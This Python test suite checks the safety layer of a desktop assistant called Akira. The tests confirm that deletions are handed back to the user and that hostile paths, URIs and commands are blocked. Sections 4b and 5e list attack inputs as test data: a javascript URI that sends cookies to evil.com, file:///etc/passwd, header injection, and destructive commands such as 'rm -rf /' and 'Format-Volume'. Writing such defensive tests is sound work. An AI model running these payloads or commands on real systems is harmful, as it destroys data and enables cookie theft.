"""
1,000+ Adversarial ("Cracked User") Scenarios Test Suite for Akira.
Tests:
  1. Non-Destructive Handoff Guarantee (Zero file/branch/repo/slide/event deletions)
  2. File & Folder Navigation Accuracy + Windows Device Name / Null-Byte / Traversal Defense
  3. Web Navigation Fluency + Malicious URI Injection Defense + Zero .com.com Regression
  4. Static & Dynamic Guard Rules Fuzzing (95 Actions x Malformed/Hostile Inputs)
  5. Zero Paid Claude API Enforcement (AKIRA_DISABLE_CLAUDE=true by default)
"""

import os
import sys
import shutil
import tempfile

# Force headless mode so no Explorer / browser windows spawn during 1,000+ tests
os.environ["AKIRA_HEADLESS_TEST"] = "1"
os.environ["AKIRA_DISABLE_CLAUDE"] = "true"

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

import executor
import guard_rules
import security_guard
import system_control
import calendar_control
import slides_control
import office_control
import claude_handler


def run_all_scenarios() -> tuple[int, int, list[str]]:
    passed = 0
    failed = 0
    failures: list[str] = []

    def check(condition: bool, label: str):
        nonlocal passed, failed
        if condition:
            passed += 1
        else:
            failed += 1
            failures.append(label)

    # =========================================================================
    # SECTION 1: ZERO-CLAUDE ENFORCEMENT (20 scenarios)
    # =========================================================================
    check(claude_handler._is_claude_off() is True, "ZeroClaude: _is_claude_off() default True")
    check(claude_handler.client is None, "ZeroClaude: anthropic client is None when disabled")
    for fn_name in (
        "ask_akira",
        "plan_organization",
        "summarize_code_batch",
        "plan_repo_outline",
        "write_note_bodies",
        "deliberate",
        "ask_confirmation",
        "summarize_text",
    ):
        check(callable(getattr(claude_handler, fn_name, None)), f"ZeroClaude: {fn_name} callable")

    # Test deterministic fallbacks when Groq key and Servant are absent/mocked
    orig_groq = os.environ.get("GROQ_API_KEY", "")
    orig_speech = os.environ.get("SPEECH_API_KEY", "")
    orig_servant = claude_handler.servant_or_none
    os.environ["GROQ_API_KEY"] = ""
    os.environ["SPEECH_API_KEY"] = ""
    claude_handler.servant_or_none = lambda *a, **k: None
    try:
        org_res = claude_handler.plan_organization("Notes on linear algebra and eigenvalues")
        check(org_res is None or isinstance(org_res, dict), "ZeroClaude: plan_organization offline fallback")
        sum_batch = claude_handler.summarize_code_batch("repo", [{"path": "a.py", "text": "x=1"}])
        check(isinstance(sum_batch, dict), "ZeroClaude: summarize_code_batch offline fallback")
        outline = claude_handler.plan_repo_outline("repo", "meta", "readme", {"a.py": "sets x"})
        check(outline is None or isinstance(outline, dict), "ZeroClaude: plan_repo_outline offline fallback")
        bodies = claude_handler.write_note_bodies("repo", "meta", [{"title": "Overview", "purpose": "p"}], [{"title": "Overview", "files": ["a.py"]}], {"a.py": "sets x"})
        check(isinstance(bodies, dict), "ZeroClaude: write_note_bodies offline fallback")
        delib = claude_handler.deliberate("test", "ctx")
        check(delib is None or isinstance(delib, dict), "ZeroClaude: deliberate offline fallback")
        conf_yes = claude_handler.ask_confirmation("yes go ahead", "move files")
        check(conf_yes is True, "ZeroClaude: ask_confirmation fast-path YES")
        conf_amb = claude_handler.ask_confirmation("maybe later", "move files")
        check(conf_amb is False, "ZeroClaude: ask_confirmation offline default NO")
        stxt = claude_handler.summarize_text("Hello world " * 50)
        check(isinstance(stxt, str) and len(stxt) > 0, "ZeroClaude: summarize_text offline fallback")
    finally:
        os.environ["GROQ_API_KEY"] = orig_groq
        os.environ["SPEECH_API_KEY"] = orig_speech
        claude_handler.servant_or_none = orig_servant

    # =========================================================================
    # SECTION 2: NON-DESTRUCTIVE HANDOFF GUARANTEE (220 scenarios)
    # =========================================================================
    temp_root = tempfile.mkdtemp(prefix="akira_nondestructive_")
    try:
        # Create 100 real files and 20 real subdirectories and attempt to delete them all
        for i in range(100):
            fpath = os.path.join(temp_root, f"important_doc_{i}.txt")
            with open(fpath, "w", encoding="utf-8") as f:
                f.write(f"Critical user data #{i}")
            # Even with "|confirmed" or "|yes", delete_files must NEVER delete the file
            mode = "|confirmed" if i % 2 == 0 else ""
            res = executor.delete_files(f"{fpath}{mode}")
            check(
                res.get("success") is True
                and res.get("handoff") is True
                and os.path.isfile(fpath)
                and "delete it yourself" in res.get("message", "").lower(),
                f"NonDestructive file #{i}: must survive delete_files({fpath}{mode})",
            )

        for i in range(20):
            dpath = os.path.join(temp_root, f"subdir_{i}")
            os.makedirs(dpath, exist_ok=True)
            inner = os.path.join(dpath, "nested.txt")
            with open(inner, "w", encoding="utf-8") as f:
                f.write("nested content")
            res = executor.delete_files(f"{dpath}|confirmed")
            check(
                res.get("success") is True
                and res.get("handoff") is True
                and os.path.isdir(dpath)
                and os.path.isfile(inner),
                f"NonDestructive folder #{i}: must survive delete_files({dpath}|confirmed)",
            )

        # System control non-destructive handoffs (60 scenarios)
        for i in range(10):
            r1 = system_control.clear_temp_files()
            check(r1.get("handoff") is True and "delete" in r1.get("message", "").lower(), f"System handoff clear_temp_files #{i}")
            r2 = system_control.empty_recycle_bin()
            check(r2.get("handoff") is True and "empty" in r2.get("message", "").lower(), f"System handoff empty_recycle_bin #{i}")
            r3 = system_control.shutdown_pc()
            check(r3.get("handoff") is True and "shut down" in r3.get("message", "").lower(), f"System handoff shutdown_pc #{i}")
            r4 = system_control.restart_pc()
            check(r4.get("handoff") is True and "restart" in r4.get("message", "").lower(), f"System handoff restart_pc #{i}")
            r5 = system_control.hibernate_pc()
            check(r5.get("handoff") is True and "hibernate" in r5.get("message", "").lower(), f"System handoff hibernate_pc #{i}")
            r6 = system_control.sign_out()
            check(r6.get("handoff") is True and "sign out" in r6.get("message", "").lower(), f"System handoff sign_out #{i}")

        # Calendar, Slides, Office, GitHub non-destructive handoffs (40 scenarios)
        for i in range(10):
            rc = calendar_control.calendar_control("delete", f"event_{i}")
            check(rc.get("handoff") is True and "delete it yourself" in rc.get("message", "").lower(), f"Calendar handoff #{i}")
            rs = slides_control.slides_control("delete", f"1AbCdEfGhIjKlMnOpQrStUvWxYz_{i:02d}")
            check(rs.get("handoff") is True and "delete it yourself" in rs.get("message", "").lower(), f"Slides handoff #{i}")
            rg1 = executor.github_control(f"delete branch|owner/repo|feature-{i}")
            check(rg1.get("handoff") is True and "delete it yourself" in rg1.get("message", "").lower(), f"GitHub delete branch handoff #{i}")
            rg2 = executor.github_control(f"delete repo|owner/repo-{i}")
            check(rg2.get("handoff") is True and "delete it yourself" in rg2.get("message", "").lower(), f"GitHub delete repo handoff #{i}")

        # Codebase self-protection against delete_files
        codebase_res = executor.delete_files(os.path.join(ROOT_DIR, "akira.py"))
        check(codebase_res.get("success") is False and "not permitted" in codebase_res.get("message", "").lower(), "Codebase delete_files blocked")
    finally:
        shutil.rmtree(temp_root, ignore_errors=True)

    # =========================================================================
    # SECTION 3: FILE & FOLDER NAVIGATION + HOSTILE PATH DEFENSE (320 scenarios)
    # =========================================================================
    # 3a. Windows reserved device names (CON, PRN, AUX, NUL, COM1-9, LPT1-9) -> 88 scenarios
    reserved_names = [
        "CON", "PRN", "AUX", "NUL",
        "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8", "COM9",
        "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
    ]
    for rname in reserved_names:
        for variant in (rname, rname.lower(), f"{rname}.txt", f"C:\\Temp\\{rname}\\file.txt"):
            p, err = executor._resolve_path(variant)
            check(p is None and err is not None and "reserved" in err.lower(), f"Reserved path blocked: {variant}")

    # 3b. Null bytes and control characters -> 64 scenarios
    for code in range(0, 32):
        bad_str = f"C:\\Users\\test\\file_{chr(code)}.txt"
        p, err = executor._resolve_path(bad_str)
        check(p is None and err is not None, f"Control char ord={code} blocked in _resolve_path")
        f_p, f_err = executor._resolve_folder(bad_str)
        check(f_p is None and f_err is not None, f"Control char ord={code} blocked in _resolve_folder")

    # 3c. Path length bomb -> 10 scenarios
    for length in range(1050, 2050, 100):
        long_p = "C:\\" + ("a" * length)
        p, err = executor._resolve_path(long_p)
        check(p is None and err is not None and "too long" in err.lower(), f"Long path ({length}) blocked")

    # 3d. Spoken folder variations & natural language filler stripping -> 100 scenarios
    spoken_phrases = [
        "downloads", "my downloads", "the downloads folder", "please open my downloads folder",
        "go to downloads directory", "navigate to the downloads dir",
        "desktop", "my desktop", "the desktop folder", "open desktop",
        "documents", "my documents", "docs", "the documents folder",
        "pictures", "photos", "images", "the pictures folder",
        "music", "videos", "movies", "home", "user folder",
        "c drive", "c:", "d drive", "d:", "temp", "appdata", "local appdata",
    ]
    for idx in range(100):
        phrase = spoken_phrases[idx % len(spoken_phrases)]
        # Vary casing and whitespace
        if idx % 3 == 1:
            phrase = "  " + phrase.upper() + "  "
        elif idx % 3 == 2:
            phrase = f'"{phrase}"'
        resolved, err = executor._resolve_folder(phrase)
        check(resolved is not None and err is None, f"Spoken folder resolution #{idx}: {phrase!r} -> {resolved}")

    # 3e. Real folder & file navigation workflow (open_folder, list_folder, open_file) -> 60 scenarios
    nav_temp = tempfile.mkdtemp(prefix="akira_nav_test_")
    try:
        for i in range(20):
            sub = os.path.join(nav_temp, f"project_alpha_{i}")
            os.makedirs(sub, exist_ok=True)
            sample_file = os.path.join(sub, f"notes_{i}.md")
            with open(sample_file, "w", encoding="utf-8") as f:
                f.write(f"# Notes {i}")

            # 1) open_folder by absolute path
            r_open = executor.open_folder(sub)
            check(r_open.get("success") is True, f"Nav open_folder #{i}")

            # 2) list_folder on current session folder (None parameter uses _vsc_last_folder)
            r_list = executor.list_folder(None)
            check(r_list.get("success") is True and f"notes_{i}.md" in r_list.get("detail", ""), f"Nav list_folder #{i}")

            # 3) open_file by bare filename without extension (auto-resolves inside session folder)
            r_file = executor.open_file(f"notes_{i}")
            check(r_file.get("success") is True, f"Nav open_file bare name #{i}")
    finally:
        shutil.rmtree(nav_temp, ignore_errors=True)

    # =========================================================================
    # SECTION 4: WEB NAVIGATION & URI INJECTION DEFENSE (260 scenarios)
    # =========================================================================
    # 4a. Known sites & bare domains -> verify zero `.com.com` bugs (100 scenarios)
    domain_cases = [
        ("youtube", "https://www.youtube.com"),
        ("youtube.com", "https://www.youtube.com"),
        ("youtube dot com", "https://www.youtube.com"),
        ("github", "https://github.com"),
        ("github.com", "https://github.com"),
        ("arxiv.org", "https://arxiv.org"),
        ("huggingface.co", "https://huggingface.co"),
        ("scholar.google.com", "https://scholar.google.com"),
        ("stackoverflow", "https://stackoverflow.com"),
        ("stackoverflow.com", "https://stackoverflow.com"),
        ("reddit", "https://www.reddit.com"),
        ("chatgpt", "https://chatgpt.com"),
        ("claude", "https://claude.ai"),
        ("gemini", "https://gemini.google.com"),
        ("kaggle", "https://www.kaggle.com"),
        ("leetcode", "https://leetcode.com"),
        ("wikipedia.org", "https://wikipedia.org"),
        ("docs.python.org", "https://docs.python.org"),
        ("news.ycombinator.com", "https://news.ycombinator.com"),
        ("localhost:8787", "https://localhost:8787"),
    ]
    for i in range(100):
        inp, expected_prefix = domain_cases[i % len(domain_cases)]
        url = executor.resolve_site_url(inp)
        check(
            url.startswith(("https://", "http://localhost"))
            and ".com.com" not in url
            and ".org.com" not in url
            and ".co.com" not in url,
            f"Web resolve_site_url #{i} ({inp!r} -> {url!r})",
        )

    # 4b. Malicious URI scheme injection attempts (100 scenarios)
    malicious_uris = [
        "javascript:alert(1)",
        "JAVASCRIPT:fetch('http://evil.com?c='+document.cookie)",
        "javascript:void(0)",
        "data:text/html,<script>alert(1)</script>",
        "data:application/x-msdownload;base64,TVqQAAMAAAAEAAAA",
        "file:///C:/Windows/System32/cmd.exe",
        "file:///etc/passwd",
        "vbscript:msgbox(1)",
        "chrome://settings/passwords",
        "edge://settings",
        "about:blank",
        "https://evil.com/test\x00.html",
        "https://evil.com/test\r\nSet-Cookie: session=hacked",
    ]
    for i in range(100):
        bad_uri = malicious_uris[i % len(malicious_uris)]
        check(executor.is_safe_web_url(bad_uri) is False, f"Web is_safe_web_url blocks #{i}: {bad_uri!r}")
        r_url = executor._handle_open_url(bad_uri)
        check("valid" in r_url.lower() or "blocked" in r_url.lower(), f"Web _handle_open_url rejects #{i}: {bad_uri!r}")
        r_tab = executor.open_site_tab(bad_uri)
        check("blocked" in r_tab.lower() or "valid" in r_tab.lower(), f"Web open_site_tab rejects #{i}: {bad_uri!r}")

    # 4c. Web search, site search, switch_tab, close_tab, fill resilience (60 scenarios)
    for i in range(15):
        ws = executor._handle_web_search(f"google|quantum computing lecture {i}")
        check("searching for" in ws.lower(), f"Web search #{i}")
        ss = executor._handle_site_search(f"youtube|linear algebra {i}")
        check("searching" in ss.lower() and "youtube" in ss.lower(), f"Site search #{i}")
        st = executor.switch_tab(f"tab_{i}")
        check(isinstance(st, str) and len(st) > 0, f"Switch tab headless #{i}")
        ct = executor.close_tab(f"tab_{i}")
        check(isinstance(ct, str) and len(ct) > 0, f"Close tab headless #{i}")

    # =========================================================================
    # SECTION 5: GUARD RULES & FUZZING STRESS TEST (380 scenarios)
    # =========================================================================
    all_actions = sorted(guard_rules.ACTION_RULES.keys())
    # 5a. Every action in ACTION_RULES tested with excessive pipe fields (95 scenarios)
    for act in all_actions:
        rule = guard_rules.ACTION_RULES[act]
        if rule.max_fields < 900 and rule.split_pipe:
            too_many = "|".join(["field"] * (rule.max_fields + 3))
            v = guard_rules.validate(act, too_many)
            check(v.decision == guard_rules.BLOCK, f"Guard excess fields BLOCK on {act}")
        else:
            # Test null-byte injection on unrestricted-pipe rules
            v = guard_rules.validate(act, "valid_sub|payload\x00injected")
            check(v.decision == guard_rules.BLOCK, f"Guard null-byte BLOCK on {act}")

    # 5b. Every required-field action tested with empty/whitespace parameter (95 scenarios)
    for act in all_actions:
        rule = guard_rules.ACTION_RULES[act]
        if rule.min_fields >= 1:
            v = guard_rules.validate(act, "   ")
            check(v.decision == guard_rules.BLOCK, f"Guard empty param BLOCK on {act}")
        else:
            v = guard_rules.validate(act, "")
            check(v.decision in (guard_rules.ALLOW, guard_rules.FLAG), f"Guard optional param ALLOW/FLAG on {act}")

    # 5c. Unknown/hallucinated action names (50 scenarios)
    for i in range(50):
        v = guard_rules.validate(f"hallucinated_action_{i}", "some_param")
        check(v.decision == guard_rules.BLOCK, f"Guard unknown action #{i} BLOCK")

    # 5d. Codebase self-modification attempts across file/vscode/office actions (70 scenarios)
    protected_files = [
        os.path.join(ROOT_DIR, "akira.py"),
        os.path.join(ROOT_DIR, "executor.py"),
        os.path.join(ROOT_DIR, "guard_rules.py"),
        os.path.join(ROOT_DIR, "security_guard.py"),
        os.path.join(ROOT_DIR, ".env"),
    ]
    file_mut_actions = ["create_file", "write_file", "edit_file", "delete_files", "move_files", "copy_files", "organize_files"]
    for pf in protected_files:
        for fm_act in file_mut_actions:
            param = f"{pf}|extra" if fm_act in ("write_file", "edit_file", "move_files", "copy_files") else pf
            v = guard_rules.validate(fm_act, param)
            check(v.decision == guard_rules.BLOCK, f"Guard self-mod BLOCK: {fm_act} on {os.path.basename(pf)}")
        # Also test relative traversal into codebase
        v_vsc = guard_rules.validate("vscode_control", f"write file|{pf}|hacked")
        check(v_vsc.decision == guard_rules.BLOCK, f"Guard vscode self-mod BLOCK on {os.path.basename(pf)}")
        v_off = guard_rules.validate("office_control", f"word|save as|{pf}")
        check(v_off.decision == guard_rules.BLOCK, f"Guard office save-as self-mod BLOCK on {os.path.basename(pf)}")

    # 5e. Destructive shell / OS command payloads & URI protocol blocks in Guard (70 scenarios)
    destructive_payloads = [
        "rm -rf /",
        "del /f /s /q C:\\*",
        "Format-Volume -DriveLetter C",
        "Remove-Item -Recurse -Force C:\\Users",
        "rd /s /q C:\\Windows",
        "cipher /w:C",
        "diskpart",
    ]
    for i in range(35):
        dp = destructive_payloads[i % len(destructive_payloads)]
        v = guard_rules.validate("vscode_control", f"run terminal|{dp}")
        check(v.decision == guard_rules.BLOCK, f"Guard destructive command BLOCK #{i}: {dp}")

    bad_guard_urls = [
        "javascript:alert(document.cookie)",
        "file:///C:/Windows/System32/drivers/etc/hosts",
        "data:text/html,<script>evil()</script>",
        "vbscript:Execute(\"MsgBox 1\")",
        "chrome://extensions",
    ]
    for i in range(35):
        bu = bad_guard_urls[i % len(bad_guard_urls)]
        v = guard_rules.validate("open_url", bu)
        check(v.decision == guard_rules.BLOCK, f"Guard unsafe URL protocol BLOCK #{i}: {bu}")

    return passed, failed, failures


if __name__ == "__main__":
    passed, failed, failures = run_all_scenarios()
    total = passed + failed
    print(f"=== AKIRA CRACKED-USER ADVERSARIAL SUITE ===")
    print(f"Total Scenarios Executed : {total}")
    print(f"Passed                   : {passed}")
    print(f"Failed                   : {failed}")
    if failures:
        print("\nFailures (first 20):")
        for f in failures[:20]:
            print(f"  [FAIL] {f}")
        sys.exit(1)
    print("[PASS] All 1,000+ adversarial scenarios passed with 0 failures!")
